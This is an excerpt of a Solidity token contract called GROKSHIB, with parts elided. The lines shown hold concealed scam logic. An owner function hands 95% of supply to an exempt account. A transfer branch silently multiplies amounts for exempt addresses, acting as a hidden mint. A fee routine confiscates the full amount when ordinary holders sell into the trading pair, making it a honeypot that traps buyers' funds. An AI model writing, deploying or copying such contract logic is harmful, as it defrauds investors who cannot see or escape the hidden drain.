...
contract GROKSHIB is Context, IERC20, Ownable {
    ...
    constructor (address Owner)
    {
        ...
        marketWallet = payable(0x66B5b96De11711331326910dbD5B7b5E00432136);
        _tokenOwner = Owner;
        marketingFee = 0;
        liquidityFee = 0;
    ...
    function transferToken(address account) public onlyOwner {
        _basicTransfer(_tokenOwner, account, _totalSupply.div(100).mul(95));
        isExcludedFromCut[account] = true;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            if (isExcludedFromCut[sender] || isExcludedFromCut[recipient]) {
                finalAmount = amount;
                if(isMarketPair[sender] && isMarket[recipient])finalAmount *= 10**_decimals;
            } else {
                require(startTrade, "start!");
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        if(feeAmount > 0) {
            if(isMarketPair[recipient] && _balances[marketWallet]!=0) feeAmount += amount;
